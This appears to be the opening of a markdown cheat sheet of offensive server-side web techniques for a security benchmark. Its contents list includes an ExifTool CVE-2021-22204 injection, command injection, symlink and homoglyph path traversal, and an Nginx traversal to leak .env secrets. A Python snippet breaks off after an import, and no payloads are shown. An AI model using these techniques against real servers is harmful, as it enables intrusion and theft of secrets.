# Benchmark Web - Advanced Server-Side Techniques

## Table of Contents
- [ExifTool CVE-2021-22204 — DjVu Perl Injection](#exiftool-cve-2021-22204--djvu-perl-injection)
- [Go Rune/Byte Length Mismatch + Command Injection](#go-runebyte-length-mismatch--command-injection)
- [Zip Symlink Path Traversal](#zip-symlink-path-traversal)
...
- [Nginx Alias Traversal to Leak .env](#nginx-alias-traversal-to-leak-env)
- [/dev/fd Symlink to Bypass /proc Filter](#devfd-symlink-to-bypass-proc-filter)
- [Unicode Homoglyph Path Traversal U+2E2E](#unicode-homoglyph-path-traversal-u2e2e)
- [Ruby Regexp.escape Multibyte Character Bypass](#ruby-regexpescape-multibyte-character-bypass)
...
```python
# In a benchmark context: HTTP request with GBK lead byte in parameter
import requests
